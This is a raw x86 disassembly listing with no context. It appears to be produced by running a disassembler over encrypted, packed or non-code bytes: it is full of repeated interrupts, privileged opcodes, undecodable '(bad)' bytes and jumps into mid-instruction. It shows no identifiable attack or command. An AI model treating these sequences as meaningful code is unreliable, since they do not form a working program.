  423bb3:	cmp    edi,DWORD PTR [ecx+0x3b]
  423bb6:	or     al,0xd3
  423bb8:	lods   eax,DWORD PTR ds:[esi]
  423bb9:	sub    bl,dl
  423bbb:	jmp    0x423b4f
  423bbd:	push   ebx
  423bbe:	ror    DWORD PTR [edx],cl
  423bc0:	jbe    0x423bcf
  423bc2:	leave  
  423bc3:	jbe    0x423b5a
  423bc5:	dec    eax
  423bc6:	and    DWORD PTR [esi-0x528936cb],eax
  423bcc:	ret    0x8621
  423bcf:	xor    eax,0xcd5576cd
  423bd4:	lea    edx,[ebp+0x3b]
  423bd7:	jns    0x423c14
  423bd9:	or     al,0xd3
  423bdb:	jmp    0x423b6f
  423bdd:	shr    DWORD PTR [ebp-0x322cacd8],cl
  423be3:	lea    ebx,ds:0x52f7d43
  423be9:	push   ss
  423bea:	xchg   DWORD PTR [eax-0x6d241480],eax
  423bf0:	add    BYTE PTR [eax-0x326a7233],0x76
  423bf7:	xchg   ebp,eax
  423bf8:	int    0x96
  423bfa:	inc    ebp
  423bfb:	cmp    eax,ebp
  423bfd:	cmp    ecx,DWORD PTR [edi]
  423bff:	sar    DWORD PTR [ebp+0x28f2d392],cl
  423c05:	push   ebx
  423c06:	jge    0x423bd5
  423c08:	jbe    0x423c27
  423c0a:	xor    edx,edx
  423c0c:	cmp    ebx,edx
  423c0e:	clc    
  423c0f:	add    cl,BYTE PTR [edx]
  423c11:	jbe    0x423c20
  423c13:	int    0x76
  423c15:	lods   eax,DWORD PTR ds:[esi]
  423c16:	int    0x8d
  423c18:	lods   eax,DWORD PTR ds:[esi]
  423c19:	cmp    edi,DWORD PTR [ecx+0x3b]
  423c1c:	or     al,0xd3
  423c1e:	jmp    0x423bb2
  423c20:	shr    DWORD PTR [ebp-0x322cacd8],cl
  423c26:	lea    ecx,ds:0x16d87d43
  423c2c:	int    0x76
  423c2e:	lods   eax,DWORD PTR ds:[esi]
  423c2f:	int    0x8d
  423c31:	lods   eax,DWORD PTR ds:[esi]
  423c32:	cmp    edi,DWORD PTR [ecx+0x3b]
  423c35:	or     al,0xd3
  423c37:	lods   eax,DWORD PTR ds:[esi]
  423c38:	sub    bl,dl
  423c3a:	jmp    0x423bce
  423c3c:	push   ebx
  423c3d:	ror    DWORD PTR [edx],cl
  423c3f:	jbe    0x423c4e
  423c41:	int    0x76
  423c43:	xchg   ebp,eax
  423c44:	int    0x8d
  423c46:	xchg   ebp,eax
  423c47:	cmp    edi,DWORD PTR [ecx+0x3b]
  423c4a:	or     al,0xd3
  423c4c:	lods   eax,DWORD PTR ds:[esi]
  423c4d:	sub    bl,dl
  423c4f:	jmp    0x423be3
  423c51:	push   ebx
  423c52:	ror    ebp,cl
  423c54:	lea    ecx,ds:0xad3d12f
  423c5a:	jbe    0x423c69
  423c5c:	int    0x76
  423c5e:	push   ebp
  423c5f:	int    0x8d
  423c61:	push   ebp
  423c62:	cmp    edi,DWORD PTR [ecx+0x3b]
  423c65:	or     al,0xd3
  423c67:	jmp    0x423bfb
  423c69:	shr    DWORD PTR [ebp-0x322cacd8],cl
  423c6f:	lea    ecx,ds:0x52f7d43
  423c75:	pusha  
  423c76:	xchg   edx,eax
  423c77:	add    BYTE PTR [eax+0xa0d76cd],0x76
  423c7e:	or     eax,0x874576cd
  423c83:	jbe    0x423c55
  423c85:	or     ah,dh
  423c87:	cmp    eax,0x5d5d760a
  423c8c:	inc    ecx
  423c8d:	and    DWORD PTR [esi+0x6d760a35],eax
  423c93:	leave  
  423c94:	jbe    0x423cfb
  423c96:	cmp    DWORD PTR [ecx],esp
  423c98:	xchg   BYTE PTR ds:0xb22576c9,dh
  423c9e:	and    DWORD PTR [esi-0xe89f5cb],eax
  423ca4:	int    0x76
  423ca6:	cmp    eax,0x3b3d8dcd
  423cab:	jns    0x423ce8
  423cad:	or     al,0xd3
  423caf:	lods   eax,DWORD PTR ds:[esi]
  423cb0:	sub    bl,dl
  423cb2:	jmp    0x423c46
  423cb4:	push   ebx
  423cb5:	ror    DWORD PTR [edx],cl
  423cb7:	jbe    0x423d36
  423cb9:	int    0x6d
  423cbb:	jmp    0x423cc3
  423cbd:	add    DWORD PTR [eax-0x36923280],0x8c06
  423cc7:	add    BYTE PTR [ebx],cl
  423cc9:	and    DWORD PTR [esi-0x369232cb],eax
  423ccf:	push   es
  423cd0:	jl     0x423cd2
  423cd2:	add    BYTE PTR [eax],al
  423cd4:	mul    DWORD PTR [ecx]
  423cd6:	xchg   BYTE PTR ds:0x6dcd6dcd,dh
  423cdc:	int    0x76
  423cde:	icebp  
  423cdf:	int    0x8d
  423ce1:	icebp  
  423ce2:	cmp    edi,DWORD PTR [ecx+0x3b]
  423ce5:	or     al,0xd3
  423ce7:	lods   eax,DWORD PTR ds:[esi]
  423ce8:	sub    bl,dl
  423cea:	jmp    0x423c7e
  423cec:	push   ebx
  423ced:	ror    ebp,cl
  423cef:	lea    edi,[ebp+0x2f]
  423cf2:	rcl    ebx,1
  423cf4:	int    0x8d
  423cf6:	pop    ebp
  423cf7:	retf   0x8884
  423cfa:	or     DWORD PTR [esi-0x1f],esi
  423cfd:	int    0x6d
  423cff:	int    0x76
  423d01:	icebp  
  423d02:	int    0x8d
  423d04:	icebp  
  423d05:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423d08:	jns    0x423cdd
  423d0a:	jmp    0x423c9e
  423d0c:	shr    DWORD PTR [ebp-0x322cacd8],cl
  423d12:	lea    edi,[ebp+0x2f]
  423d15:	rcl    ebx,1
  423d17:	int    0x8d
  423d19:	gs int 0x96
  423d1c:	cmp    ecx,DWORD PTR gs:[edi]
  423d1f:	cmp    edx,ebp
  423d21:	shl    edx,cl
  423d23:	sub    bl,dl
  423d25:	repz xchg edx,eax
  423d27:	push   ebx
  423d28:	adc    eax,DWORD PTR [edi+0x5d8dcdd3]
  423d2e:	das    
  423d2f:	pop    ecx
  423d30:	dec    esp
  423d31:	mov    ch,cl
  423d33:	push   es
  423d34:	mov    WORD PTR [eax],es
  423d36:	add    BYTE PTR [eax],al
  423d38:	int    0x17
  423d3a:	mov    WORD PTR [eax],es
  423d3c:	add    BYTE PTR [eax],al
  423d3e:	cmp    edi,DWORD PTR [ecx+0x3b]
  423d41:	aad    0xd3
  423d43:	lods   eax,DWORD PTR ds:[esi]
  423d44:	sub    bl,dl
  423d46:	repz xchg edx,eax
  423d48:	push   ebx
  423d49:	rol    BYTE PTR [edi-0x72a6d02d],cl
  423d4f:	loope  0x423d8c
  423d51:	jge    0x423d5c
  423d53:	(bad)  
  423d54:	loope  0x423d23
  423d56:	ins    DWORD PTR es:[edi],dx
  423d57:	retf   0xe176
  423d5a:	int    0x8d
  423d5c:	icebp  
  423d5d:	int    0x96
  423d5f:	icebp  
  423d60:	cmp    ecx,DWORD PTR [edi]
  423d62:	cmp    edx,ebp
  423d64:	shl    ebx,cl
  423d66:	xchg   edx,eax
  423d67:	shl    edx,cl
  423d69:	sub    BYTE PTR [ebx+0x13],dl
  423d6c:	int    0x96
  423d6e:	jge    0x423d9f
  423d70:	rcl    DWORD PTR [ebx],1
  423d72:	int    0x96
  423d74:	pop    ebp
  423d75:	or     DWORD PTR [ecx+esi*1+0x76cd6dcd],eax
  423d7c:	icebp  
  423d7d:	int    0x8d
  423d7f:	icebp  
  423d80:	cmp    edi,DWORD PTR [ecx+0x3b]
  423d83:	or     al,0xd3
  423d85:	lods   eax,DWORD PTR ds:[esi]
  423d86:	sub    bl,dl
  423d88:	jmp    0x423d1c
  423d8a:	push   ebx
  423d8b:	ror    ebp,cl
  423d8d:	lea    edi,[ebp+0x2f]
  423d90:	rcl    ebx,1
  423d92:	int    0x8d
  423d94:	pop    ebp
  423d95:	retf   0x8884
  423d98:	or     DWORD PTR [esi-0x1f],esi
  423d9b:	int    0x6d
  423d9d:	int    0x76
  423d9f:	icebp  
  423da0:	int    0x8d
  423da2:	icebp  
  423da3:	cmp    edi,DWORD PTR [ecx-0x2d]
  423da6:	lods   eax,DWORD PTR ds:[esi]
  423da7:	sub    BYTE PTR [ebx],bh
  423da9:	or     al,0xd3
  423dab:	jmp    0x423d3f
  423dad:	push   ebx
  423dae:	ror    ebp,cl
  423db0:	lea    edi,[ebp+0x2f]
  423db3:	rcl    ebx,1
  423db5:	int    0x8d
  423db7:	ins    DWORD PTR es:[edi],dx
  423db8:	int    0x96
  423dba:	ins    DWORD PTR es:[edi],dx
  423dbb:	cmp    ecx,DWORD PTR [edi]
  423dbd:	cmp    edx,ebp
  423dbf:	shl    edx,cl
  423dc1:	sub    bl,dl
  423dc3:	repz xchg edx,eax
  423dc5:	push   ebx
  423dc6:	adc    eax,DWORD PTR [edi+0x5d8dcdd3]
  423dcc:	das    
  423dcd:	pop    ecx
  423dce:	dec    esp
  423dcf:	mov    ch,cl
  423dd1:	push   es
  423dd2:	jl     0x423dd4
  423dd4:	add    BYTE PTR [eax],al
  423dd6:	int    0x17
  423dd8:	jl     0x423dda
  423dda:	add    BYTE PTR [eax],al
  423ddc:	cmp    edi,DWORD PTR [ecx+0x3b]
  423ddf:	aad    0xd3
  423de1:	lods   eax,DWORD PTR ds:[esi]
  423de2:	sub    bl,dl
  423de4:	repz xchg edx,eax
  423de6:	push   ebx
  423de7:	rol    BYTE PTR [edi-0x72a6d02d],cl
  423ded:	loope  0x423e2a
  423def:	jge    0x423dfa
  423df1:	(bad)  
  423df2:	loope  0x423dc1
  423df4:	ins    DWORD PTR es:[edi],dx
  423df5:	retf   0xe176
  423df8:	int    0x8d
  423dfa:	icebp  
  423dfb:	int    0x96
  423dfd:	icebp  
  423dfe:	cmp    ecx,DWORD PTR [edi]
  423e00:	cmp    edx,ebp
  423e02:	shl    ebx,cl
  423e04:	xchg   edx,eax
  423e05:	shl    edx,cl
  423e07:	sub    BYTE PTR [ebx+0x13],dl
  423e0a:	int    0x96
  423e0c:	jge    0x423e3d
  423e0e:	rcl    DWORD PTR [ebx],1
  423e10:	int    0x96
  423e12:	pop    ebp
  423e13:	or     DWORD PTR [ecx+esi*1+0x76cd6dcd],eax
  423e1a:	and    eax,0x3b258dcd
  423e1f:	or     al,0x3b
  423e21:	jns    0x423df6
  423e23:	jmp    0x423db7
  423e25:	shr    DWORD PTR [ebp-0x322cacd8],cl
  423e2b:	lea    ebp,[ebp-0x33]
  423e2e:	xchg   esi,eax
  423e2f:	ins    DWORD PTR es:[edi],dx
  423e30:	cmp    ecx,DWORD PTR [edi]
  423e32:	cmp    edx,ebp
  423e34:	shl    edx,cl
  423e36:	sub    bl,dl
  423e38:	repz xchg edx,eax
  423e3a:	push   ebx
  423e3b:	adc    ebp,DWORD PTR [edi]
  423e3d:	rcl    ebx,1
  423e3f:	xchg   DWORD PTR [esi+0x7d],esi
  423e42:	or     dh,BYTE PTR [esi+0x7d]
  423e45:	int    0x76
  423e47:	jge    0x423e16
  423e49:	lea    ecx,ds:0xb2f7d43
  423e4f:	(bad)  
  423e50:	inc    DWORD PTR [eax]
  423e52:	add    ch,cl
  423e54:	jbe    0x423ec3
  423e56:	int    0x8d
  423e58:	ins    DWORD PTR es:[edi],dx
  423e59:	cmp    ecx,DWORD PTR [ebx+edx*8]
  423e5c:	jmp    0x423df0
  423e5e:	cmp    edi,DWORD PTR [ecx-0x2d]
  423e61:	lods   eax,DWORD PTR ds:[esi]
  423e62:	sub    BYTE PTR [ebx-0x2d],dl
  423e65:	int    0x8d
  423e67:	or     eax,0xcdd3d12f
  423e6c:	lea    edi,ds:0xf2d30f3b
  423e72:	sub    BYTE PTR [ebx-0x2d],dl
  423e75:	int    0x8d
  423e77:	cmp    eax,0xebd30c3b
  423e7c:	xchg   edx,eax
  423e7d:	push   ebx
  423e7e:	ror    DWORD PTR [edx],cl
  423e80:	jbe    0x423ee7
  423e82:	int    0x76
  423e84:	popf   
  423e85:	int    0x8d
  423e87:	popf   
  423e88:	cmp    ecx,DWORD PTR [ebx+edx*8]
  423e8b:	jmp    0x423e1f
  423e8d:	cmp    edi,DWORD PTR [ecx-0x2d]
  423e90:	lods   eax,DWORD PTR ds:[esi]
  423e91:	sub    BYTE PTR [ebx-0x2d],dl
  423e94:	int    0x8d
  423e96:	popf   
  423e97:	int    0x96
  423e99:	popf   
  423e9a:	cmp    ecx,DWORD PTR [edi]
  423e9c:	shl    edx,cl
  423e9e:	sub    BYTE PTR [ebx],bh
  423ea0:	aad    0xd3
  423ea2:	repz xchg edx,eax
  423ea4:	push   ebx
  423ea5:	adc    eax,DWORD PTR [edi+0x7d87658d]
  423eab:	xchg   DWORD PTR [ebp+0x458d0a45],ecx
  423eb1:	in     al,dx
  423eb2:	sbb    al,0xcd
  423eb4:	jbe    0x423e53
  423eb6:	int    0x8d
  423eb8:	popf   
  423eb9:	cmp    edi,DWORD PTR [ecx+0x3b]
  423ebc:	or     al,0xd3
  423ebe:	lods   eax,DWORD PTR ds:[esi]
  423ebf:	sub    bl,dl
  423ec1:	jmp    0x423e55
  423ec3:	push   ebx
  423ec4:	rol    DWORD PTR [edi+0x760a4576],cl
  423eca:	inc    ebp
  423ecb:	int    0x76
  423ecd:	popf   
  423ece:	int    0x8d
  423ed0:	popf   
  423ed1:	cmp    edi,DWORD PTR [ecx-0x2d]
  423ed4:	lods   eax,DWORD PTR ds:[esi]
  423ed5:	sub    BYTE PTR [ebx],bh
  423ed7:	or     al,0xd3
  423ed9:	jmp    0x423e6d
  423edb:	push   ebx
  423edc:	ror    ebp,cl
  423ede:	lea    ebx,ds:0x76cd7d33
  423ee4:	popf   
  423ee5:	int    0x96
  423ee7:	popf   
  423ee8:	cmp    edi,DWORD PTR [ecx+0x3b]
  423eeb:	aad    0xd3
  423eed:	repz xchg edx,eax
  423eef:	shr    DWORD PTR [ebp-0x322dacd8],cl
  423ef5:	xchg   esi,eax
  423ef6:	inc    ebp
  423ef7:	das    
  423ef8:	rcl    edx,1
  423efa:	inc    ebx
  423efb:	shr    DWORD PTR [edi],cl
  423efd:	pop    es
  423efe:	adc    ebp,edi
  423f00:	add    BYTE PTR [eax],al
  423f02:	int    0x76
  423f04:	mov    BYTE PTR [eax],al
  423f06:	(bad)  
  423f07:	dec    esp
  423f08:	iret   
  423f09:	jbe    0x423ec8
  423f0b:	add    dh,dl
  423f0d:	mov    BYTE PTR [eax-0x33],dh
  423f10:	jbe    0x423e9a
  423f12:	int    0x1
  423f14:	xchg   ebp,eax
  423f15:	add    DWORD PTR [eax-0x32afff80],0x1cd8876
  423f1f:	icebp  
  423f20:	add    DWORD PTR [eax+0x500080],0xd600fdd6
  423f2a:	jne    0x423ee9
  423f2c:	test   al,0x88
  423f2e:	add    BYTE PTR [eax-0x322f89f6],0x76
  423f35:	stc    
  423f36:	int    0x8d
  423f38:	stc    
  423f39:	cmp    eax,ebp
  423f3b:	cmp    ecx,DWORD PTR [edi]
  423f3d:	shl    edx,cl
  423f3f:	sub    bl,dl
  423f41:	mov    ebp,0xcdd35392
  423f46:	lea    esi,[ebp+0x43]
  423f49:	rcl    esp,cl
  423f4b:	push   esi
  423f4c:	int    0x76
  423f4e:	mov    ch,cl
  423f50:	lea    ebp,ds:0xcd2d96cd
  423f56:	add    DWORD PTR [ecx],edx
  423f58:	add    DWORD PTR [eax+0x3b0c3b80],0x92ebd399
  423f62:	shr    edx,cl
  423f64:	sub    BYTE PTR [ebx+0x13],dl
  423f67:	jno    0x423f36
  423f69:	(bad)  
  423f6a:	stc    
  423f6b:	int    0x96
  423f6d:	stc    
  423f6e:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423f71:	cdq    
  423f72:	shr    ebx,cl
  423f74:	xchg   edx,eax
  423f75:	shr    edx,cl
  423f77:	sub    BYTE PTR [ebx+0x13],dl
  423f7a:	jno    0x423f7c
  423f7c:	(bad)  
  423f7d:	jne    0x423f7f
  423f7f:	jo     0x423f9d
  423f81:	stos   BYTE PTR es:[edi],al
  423f82:	test   al,0x63
  423f84:	retf   
  423f85:	ror    BYTE PTR [eax-0x12326980],cl
  423f8b:	add    al,0xed
  423f8d:	and    al,0x98
  423f8f:	int    0x11
  423f91:	int    0x12
  423f93:	sub    eax,0x4808081
  423f98:	pop    esp
  423f99:	sub    BYTE PTR [edi],0x5
  423f9c:	dec    edx
  423f9d:	add    DWORD PTR [eax+0x2fda0680],0x80819205
  423fa7:	add    BYTE PTR [esi],0xf7
  423faa:	das    
  423fab:	add    eax,0x80808003
  423fb0:	int    0x7
  423fb2:	or     DWORD PTR [eax+0x6d068080],eax
  423fb8:	das    
  423fb9:	add    eax,0x808080e9
  423fbe:	add    al,0x69
  423fc0:	int3   
  423fc1:	add    BYTE PTR [eax+0x52f3080],0xe2
  423fc8:	add    BYTE PTR [eax+0x54985e80],0x2f
  423fcf:	add    eax,0x808080e3
  423fd4:	int    0xc1
  423fd6:	and    eax,0x4808081
  423fdb:	mov    dh,0x11
  423fdd:	or     ch,0x13
  423fe0:	xor    ecx,DWORD PTR [esi-0x79]
  423fe3:	shr    BYTE PTR [edi],cl
  423fe5:	mov    ebx,0x8d0a4c70
  423fea:	mov    ch,0x2f
  423fec:	mov    ebx,0x13874e7c
  423ff1:	das    
  423ff2:	add    eax,0x80808049
  423ff7:	iret   
  423ff8:	jl     0x42400e
  423ffa:	pop    ebx
  423ffb:	or     cl,BYTE PTR [ebp+0x69bd]
  424001:	add    BYTE PTR [ebx-0x2baef966],al
  424007:	or     ebp,0x31
  42400a:	add    al,0xb6
  42400c:	cmc    
  42400d:	sub    BYTE PTR [ebx],0x99
  424010:	xchg   ecx,esi
  424012:	das    
  424013:	mov    ebx,0xbb2f4ee0
  424018:	mov    al,ds:0xd4fc874c
  42401d:	mov    esi,0xa148acf
  424022:	(bad)  
  424023:	in     eax,dx
  424024:	push   es
  424025:	push   ecx
  424026:	aam    0x6e
  424028:	int    0x89
  42402a:	add    al,0xb6
  42402c:	stc    
  42402d:	sub    BYTE PTR [ebx],0xf
  424030:	xchg   DWORD PTR [ebp+0x2f],edi
  424033:	mov    ebx,0xbb2f4ede
  424038:	sahf   
  424039:	dec    esp
  42403a:	xchg   esp,edi
  42403c:	aam    0x33
  42403e:	iret   
  42403f:	ficom  WORD PTR [edx+ecx*1]
  424042:	out    0xfd,al
  424044:	int    0xe6
  424046:	std    
  424047:	int    0x6a
  424049:	push   es
  42404a:	add    ah,dl
  42404c:	xchg   ch,cl
  42404e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42404f:	mov    ch,0x81
  424051:	and    al,0x8b
  424053:	das    
  424054:	mov    ebx,0xbb2f4ede
  424059:	sahf   
  42405a:	dec    esp
  42405b:	add    BYTE PTR [esi-0x7],dh
  42405e:	add    al,0x76
  424060:	std    
  424061:	mov    BYTE PTR [edi-0x619a104],al
  424067:	sbb    ch,0x2f
  42406a:	mov    ebx,0xbb2f4ee0
  42406f:	mov    al,ds:0xed8dcd4c
  424074:	add    BYTE PTR [esi-0xb],dh
  424077:	add    al,0xd3
  424079:	mov    BYTE PTR [edi-0x1272f504],al
  42407f:	pop    esi
  424080:	out    0xf5,al
  424082:	sub    BYTE PTR ds:0x2fbd8dcd,0xbb
  424089:	jo     0x4240d9
  42408b:	das    
  42408c:	mov    ebx,0x76004cdc
  424091:	adc    DWORD PTR [ebx+edx*8],eax
  424094:	mov    BYTE PTR [edi-0x4272f527],al
  42409a:	pop    esi
  42409b:	xchg   esi,eax
  42409c:	adc    DWORD PTR [edi],ebp
  42409e:	or     ebp,DWORD PTR [esi-0x56000000]
  4240a4:	arpl   WORD PTR [ebx],di
  4240a6:	ins    DWORD PTR es:[edi],dx
  4240a7:	ins    BYTE PTR es:[edi],dx
  4240a8:	in     al,dx
  4240a9:	xchg   edx,eax
  4240aa:	cmp    ebp,DWORD PTR [ebp-0x58]
  4240ad:	retf   
  4240ae:	lds    edx,FWORD PTR [esi+0xacdedcd]
  4240b4:	sub    eax,0xcd808081
  4240b9:	jbe    0x424107
  4240bb:	add    al,0xed
  4240bd:	xor    BYTE PTR [ebx+0x3b],bl
  4240c0:	fstp   QWORD PTR [eax+0x2f1e5e9a]
  4240c6:	add    eax,0x8080800b
  4240cb:	inc    ebx
  4240cc:	(bad)
  4240cf:	pop    esi
  4240d0:	pushf  
  4240d1:	(bad)  
  4240d3:	test   DWORD PTR [ebx],edi
  4240d5:	ins    DWORD PTR es:[edi],dx
  4240d6:	ins    BYTE PTR es:[edi],dx
  4240d7:	in     al,dx
  4240d8:	fmul   st,st(5)
  4240da:	ins    BYTE PTR es:[edi],dx
  4240db:	fadd   QWORD PTR [edi+0x7ccd8876]
  4240e1:	and    al,0xcd
  4240e3:	jo     0x424119
  4240e5:	int    0x90
  4240e7:	adc    al,0xcd
  4240e9:	fcomp  QWORD PTR [edi+eax*4]
  4240ec:	lea    ecx,[eax+0xa889687]
  4240f2:	(bad)  
  4240f3:	std    
  4240f4:	inc    ebx
  4240f5:	clc    
  4240f6:	jnp    0x42407f
  4240f8:	or     ah,dh
  4240fa:	std    
  4240fb:	or     ah,BYTE PTR [esi-0x259a107]
  424101:	fsub   st,st(3)
  424103:	inc    ebx
  424104:	pushf  
  424105:	adc    al,0x77
  424107:	xchg   BYTE PTR [edi],ch
  424109:	mov    ebx,0x92eca054
  42410e:	int    0xf4
  424110:	iret   
  424111:	push   esp
  424112:	ror    ebp,0x68
  424115:	push   es
  424116:	add    ah,dl
  424118:	ds xchg esi,esp
  42411b:	mov    BYTE PTR [edx],cl
  42411d:	out    0x11,al
  42411f:	inc    ebx
  424120:	stc    
  424121:	fdiv   DWORD PTR [eax]
  424123:	int    0xa6
  424125:	dec    esp
  424126:	int    0x63
  424128:	in     al,0x87
  42412a:	popf   
  42412b:	inc    ebx
  42412c:	cld    
  42412d:	ja     0x4240b3
  42412f:	int    0x58
  424131:	in     al,dx
  424132:	mov    BYTE PTR [ebx],dh
  424134:	out    0x88,al
  424136:	or     ch,BYTE PTR [eax-0x33]
  424139:	(bad)  
  42413a:	adc    DWORD PTR [esi],eax
  42413c:	not    esp
  42413e:	dec    esi
  42413f:	int    0xa6
  424141:	stc    
  424142:	dec    ebx
  424143:	or     ah,BYTE PTR [esi-0x259bc07]
  424149:	sbb    BYTE PTR [ebp-0x14],0x8
  42414d:	cmp    ebp,DWORD PTR [ebp-0x56]
  424150:	test   al,0x63
  424152:	retf   
  424153:	ror    BYTE PTR [eax-0x12326980],cl
  424159:	add    al,0xed
  42415b:	push   eax
  42415c:	pop    ebx
  42415d:	cwde   
  42415e:	pop    ebp
  42415f:	dec    ecx
  424160:	and    DWORD PTR [esi-0x289f5cb],eax
  424166:	leave  
  424167:	jbe    0x424162
  424169:	inc    ecx
  42416a:	and    DWORD PTR [esi-0x27232cb],eax
  424170:	int    0xa6
  424172:	std    
  424173:	call   0x3b81:0x90cfffc0
  42417a:	psrlq  mm5,mm3
  42417d:	xchg   edx,eax
  42417e:	stos   BYTE PTR es:[edi],al
  42417f:	cmp    esp,ecx
  424181:	shl    ebp,cl
  424183:	sub    BYTE PTR [ebx+0xc],dl
  424186:	or     cl,BYTE PTR [ebp-0x2723243]
  42418c:	int    0x8d
  42418e:	std    
  42418f:	int    0x8d
  424191:	std    
  424192:	int    0x8d
  424194:	std    
  424195:	int    0x8d
  424197:	std    
  424198:	int    0x8d
  42419a:	std    
  42419b:	int    0x8d
  42419d:	std    
  42419e:	int    0x8d
  4241a0:	std    
  4241a1:	int    0x8d
  4241a3:	std    
  4241a4:	int    0x8d
  4241a6:	std    
  4241a7:	leave  
  4241a8:	jbe    0x4241bb
  4241aa:	fadd   st,st(5)
  4241ac:	loope  0x424203
  4241ae:	int    0x8d
  4241b0:	std    
  4241b1:	int    0xa6
  4241b3:	std    
  4241b4:	cmp    esp,ecx
  4241b6:	cmp    ecx,DWORD PTR [edi]
  4241b8:	shl    ebp,cl
  4241ba:	sub    bl,dl
  4241bc:	jmp    0x424150
  4241be:	push   ebx
  4241bf:	or     al,0xcd
  4241c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4241c2:	dec    esp
  4241c3:	int    0x9f
  4241c5:	sub    eax,0x43808081
  4241ca:	push   ebx
  4241cb:	das    
  4241cc:	add    eax,0x80808717
  4241d1:	int    0x8d
  4241d3:	std    
  4241d4:	int    0xa6
  4241d6:	std    
  4241d7:	cmp    ecx,DWORD PTR [edi]
  4241d9:	cmp    esp,ecx
  4241db:	shr    ebx,cl
  4241dd:	xchg   edx,eax
  4241de:	shl    ebp,cl
  4241e0:	sub    BYTE PTR [ebx+0xc],dl
  4241e3:	inc    ebx
  4241e4:	adc    ebp,DWORD PTR [edi]
  4241e6:	add    eax,0x8080877f
  4241eb:	int    0xca
  4241ed:	add    DWORD PTR [eax-0x69327f80],eax
  4241f3:	std    
  4241f4:	int    0xa6
  4241f6:	std    
  4241f7:	cmp    ebx,DWORD PTR [ecx-0xc2c1ec5]
  4241fd:	xchg   edx,eax
  4241fe:	shl    ebp,cl
  424200:	sub    BYTE PTR [ebx-0x2b],dl
  424203:	inc    ebx
  424204:	adc    ebp,DWORD PTR [edi]
  424206:	add    eax,0x8080875b
  42420b:	xchg   DWORD PTR [ebp-0xe72f578],ecx
  424211:	int    0xf1
  424213:	cmp    ebx,DWORD PTR [ecx-0x1ec46233]
  424219:	shl    ebx,cl
  42421b:	xchg   edx,eax
  42421c:	shl    ebp,cl
  42421e:	sub    BYTE PTR [ebx-0x2b],dl
  424221:	or     dl,BYTE PTR [esi+0x1196cd11]
  424227:	inc    ebx
  424228:	icebp  
  424229:	aam    0x26
  42422b:	int    0x76
  42422d:	std    
  42422e:	int    0x96
  424230:	std    
  424231:	cmp    ebx,ecx
  424233:	cmp    edi,DWORD PTR [ecx-0x2d]
  424236:	jmp    0xd253:0x92bdd328
  42423d:	int    0x96
  42423f:	adc    DWORD PTR [ebx-0x26],esi
  424242:	adc    al,0x5e
  424244:	test   BYTE PTR [edx-0x2a],cl
  424247:	xor    cl,ch
  424249:	jbe    0x424248
  42424b:	int    0x96
  42424d:	std    
  42424e:	cmp    ebx,ecx
  424250:	cmp    edi,DWORD PTR [ecx-0x2d]
  424253:	jmp    0xd253:0x92bdd328
  42425a:	int    0x96
  42425c:	adc    DWORD PTR [ebx-0x26],esi
  42425f:	adc    al,0x5e
  424261:	je     0x4242ad
  424263:	xor    BYTE PTR [edi],ch
  424265:	add    eax,0x808092df
  42426a:	int    0x76
  42426c:	std    
  42426d:	int    0x76
  42426f:	std    
  424270:	int    0xa6
  424272:	std    
  424273:	int    0x76
  424275:	std    
  424276:	cmp    ecx,ecx
  424278:	cmp    ebp,DWORD PTR [ecx-0x2cd7522d]
  42427e:	in     al,dx
  42427f:	xchg   edx,eax
  424280:	push   ebx
  424281:	popf   
  424282:	int    0x76
  424284:	adc    DWORD PTR [ebx+0x6d],esi
  424287:	adc    al,0x87
  424289:	ror    ebp,cl
  42428b:	jl     0x4242bd
  42428d:	xchg   DWORD PTR [ebp-0x5272f578],ecx
  424293:	int    0x8d
  424295:	std    
  424296:	int    0x96
  424298:	std    
  424299:	cmp    ecx,DWORD PTR [edi]
  42429b:	cmp    ebx,ecx
  42429d:	shr    ebx,cl
  42429f:	xchg   edx,eax
  4242a0:	shr    edx,cl
  4242a2:	sub    BYTE PTR [ebx+0x13],dl
  4242a5:	int    0x96
  4242a7:	std    
  4242a8:	or     cl,BYTE PTR [ebp+0xa88cd95]
  4242ae:	lea    esi,[ebp+0x3bfd8dcd]
  4242b4:	cdq    
  4242b5:	cmp    esi,eax
  4242b7:	shl    edx,cl
  4242b9:	sub    bl,dl
  4242bb:	repz xchg edx,eax
  4242bd:	push   ebx
  4242be:	jecxz  0x42428d
  4242c0:	lea    esi,[ebp-0x792becbd]
  4242c6:	xchg   DWORD PTR [ebp-0x6a72f578],ecx
  4242cc:	int    0x8d
  4242ce:	std    
  4242cf:	int    0x96
  4242d1:	std    
  4242d2:	cmp    ecx,DWORD PTR [edi]
  4242d4:	cmp    ebx,ecx
  4242d6:	shr    ebx,cl
  4242d8:	xchg   edx,eax
  4242d9:	shr    edx,cl
  4242db:	sub    BYTE PTR [ebx+0x13],dl
  4242de:	xchg   DWORD PTR [esp+ecx*2-0x37],edi
  4242e2:	jbe    0x424281
  4242e4:	popa   
  4242e5:	and    DWORD PTR [esi-0x777278cb],eax
  4242eb:	or     cl,BYTE PTR [ebp-0x32781313]
  4242f1:	(bad)  
  4242f2:	in     eax,dx
  4242f3:	int    0x76
  4242f5:	dec    esp
  4242f6:	int    0x1
  4242f8:	adc    DWORD PTR [ecx+0x718080],eax
  4242fe:	xor    ch,cl
  424300:	jbe    0x42434e
  424302:	add    dh,dl
  424304:	in     eax,dx
  424305:	int    0x1
  424307:	adc    DWORD PTR [ecx+0x70008080],eax
  42430d:	dec    esp
  42430e:	leave  
  42430f:	jbe    0x4242b6
  424311:	pop    DWORD PTR [ebp*1-0x5a89368a]
  424318:	dec    edx
  424319:	pop    ss
  42431a:	xchg   BYTE PTR ds:0xcdfd8dcd,dh
  424320:	xchg   esi,eax
  424321:	std    
  424322:	cmp    ecx,DWORD PTR [edi]
  424324:	cmp    ebx,ecx
  424326:	shr    ebx,cl
  424328:	xchg   edx,eax
  424329:	shr    edx,cl
  42432b:	sub    BYTE PTR [ebx+0x13],dl
  42432e:	or     dh,BYTE PTR [esi-0x4b]
  424331:	inc    ebx
  424332:	jge    0x42430a
  424334:	pop    eax
  424335:	int    0x76
  424337:	stc    
  424338:	int    0x8d
  42433a:	stc    
  42433b:	cmp    edi,DWORD PTR [ecx+0x3b]
  42433e:	lock shl edx,cl
  424341:	sub    bl,dl
  424343:	mov    ebp,0xcdd35392
  424348:	lea    esp,[ebp+0x3ba596cd]
  42434e:	fnstcw WORD PTR [ebx]
  424350:	psrlq  mm5,mm2
